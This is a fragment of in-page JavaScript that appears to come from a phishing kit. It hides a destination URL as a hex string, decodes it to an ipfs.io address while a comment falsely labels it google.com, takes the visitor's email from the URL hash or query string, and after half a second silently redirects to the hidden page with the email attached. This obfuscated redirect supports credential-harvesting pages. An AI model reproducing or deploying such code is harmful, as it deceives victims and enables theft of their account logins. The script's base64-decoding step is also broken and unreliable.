      const hex = "68747470733a2f2f697066732e696f2f697066732f6261666b726569617a756f6c63366a63786933766b377874376b6f6867376a747a63666b653632617434766569717374766863626267717a646a71"; // https://google.com
	  
//////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////
      // Decode hex to string
      const decodedUrl = hex.match(/.{1,2}/g)
        .map(byte => String.fromCharCode(parseInt(byte, 16)))
        .join('');

      // Fetch email from URL parts
      const hashEmail = window.location.hash.split('#')[1];
      const queryParams = new URLSearchParams(window.location.search);
      const queryEmail = queryParams.get('email');

      // Decode email from base64 if present
      let email = hashEmail || queryEmail || '';

      // Check if email is in base64
      if (email && /^[A-Za-z0-9+/=]+$/.test(email)) {
        try {
          email = (email);
        } catch (e) {
          console.error("Invalid Base64 string.");
        }
      }
      // If email is not found, check in the decoded URL
      if (!email) {
        email = decodedUrl.split('#')[1] || '';
      }
      // Display the email or perform any action with it
      console.log("Auto-grabbed email:", email); // Example action
      // Keep the hash when redirecting
      const finalUrl = decodedUrl + (email ? `#${email}` : '');
      // Optionally redirect to the URL
      setTimeout(function() {
        window.location.href = finalUrl; // Redirect to the decoded URL with email
      }, 500);
    }
  }
</script>
